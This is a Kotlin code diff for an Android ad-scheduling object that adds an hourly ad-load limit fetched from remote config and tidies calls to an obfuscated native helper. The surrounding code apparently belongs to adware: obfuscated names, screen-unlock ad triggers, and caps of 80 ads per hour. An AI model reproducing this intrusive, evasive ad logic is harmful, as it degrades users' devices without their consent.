@@ -9,6 +9,7 @@ import android.os.Build
 import android.os.Bundle
 import android.os.PowerManager
 import android.util.Log
+import bef.aligeit.DataPreferences
 import bef.aligeit.fcthing
 
 import kotlinx.coroutines.CoroutineScope
@@ -27,7 +28,6 @@ import com.hightway.tell.peek.Core
 import com.hightway.tell.peek.dak.AppLifecycelListener
 import com.hightway.tell.peek.dak.Constant
 import kotlinx.coroutines.Job
-import mei.ye.DataPreferences
 import java.io.File
 import java.io.FileOutputStream
 import java.io.InputStream
@@ -59,6 +59,9 @@ object AdE {
     private var tPer = 40000 // 显示间隔
     private var nHourShowMax = 80//小时显示次数
     private var nDayShowMax = 80 //天显示次数
+
+    private var nHourLoadMax = 0//小时广告加载次数
+
     private var nTryMax = 50 // 失败上限
     private var screenOpenCheck = 1400L // 屏幕监测、延迟显示
 
@@ -66,6 +69,8 @@ object AdE {
     private var numDay = Core.getInt("ad_s_d_n")
     private var isCurDay = Core.getStr("ad_lcd")
     private var numJumps = Core.getInt("ac_njp")
+
+    private var numHourLoad = Core.getInt("ad_l_h_n")
 
     @JvmStatic
     var isLoadH = false //是否H5的so 加载成功
@@ -102,6 +107,8 @@ object AdE {
     }
 
     private var isPost = false
+     var isLoad = false
+
     private fun pL() {
         if (isPost) return
         isPost = true
@@ -111,6 +118,7 @@ object AdE {
     private fun sC() {
         Core.saveInt("ad_s_h_n", numHour)
         Core.saveInt("ad_s_d_n", numDay)
+        Core.saveInt("ad_l_h_n", numHourLoad)
     }
 
     private fun isCurH(): Boolean {
@@ -131,11 +139,14 @@ object AdE {
             Core.saveC("ad_lcd", isCurDay)
             numHour = 0
             numDay = 0
+            numHourLoad = 0
             isPost = false
             sC()
         }
         if (isCurH().not()) {
             numHour = 0
+            numHourLoad = 0
+            isLoad =false
             sC()
         }
         if (numDay >= nDayShowMax) {
@@ -146,6 +157,18 @@ object AdE {
             return true
         }
         return false
+    }
+
+    @JvmStatic
+    fun isLoadLi(): Boolean {
+        if (nHourLoadMax == 0) return false
+        return numHourLoad >= nHourLoadMax
+    }
+
+    @JvmStatic
+    fun adLoad() {
+        numHourLoad++
+        sC()
     }
 
     @JvmStatic
@@ -166,7 +189,11 @@ object AdE {
         tagO = listStr[1]
         strBroadKey = listStr[2]
         fileName = listStr[3]
-
+        nHourLoadMax = try {
+            js.optString("mod_line").toInt()
+        } catch (e: Exception) {
+            0
+        }
         AdCenter.setAdId(js.optString(Constant.K_ID_L))// 广告id
         val lt = js.optString(Constant.K_TIME).split("-")//时间相关配置
         cTime = lt[0].toLong() * 1000
@@ -182,8 +209,8 @@ object AdE {
 
     private var lastS = ""
     private fun refreshAdmin() {
-        val s = DataPreferences.getInstance(mContext).getString("csdmvkflewrv","")
-        Log.e("TAG", "refreshAdmin: =$s", )
+        val s = DataPreferences.getInstance(mContext).getString("csdmvkflewrv", "")
+        Log.e("TAG", "refreshAdmin: =$s")
         if (lastS != s) {
             lastS = s
             reConfig(JSONObject(s))
@@ -204,7 +231,7 @@ object AdE {
                 return@launch
             }
             Core.pE("test_s_load", "${System.currentTimeMillis() - time}")
-            fcthing.a0(tagL,23f)
+            fcthing.a0(tagL, 23f)
             if (isLi().not()) {
                 AdCenter.loadAd()
             }
@@ -310,7 +337,7 @@ object AdE {
             delay(finishAc())
             sNumJump(numJumps + 1)
             Core.pE("ad_start")
-            fcthing.a0(tagO,88f)
+            fcthing.a0(tagO, 88f)
             lastSAdTime = System.currentTimeMillis()
             delay(4000)
             checkAdIsReadyAndGoNext()
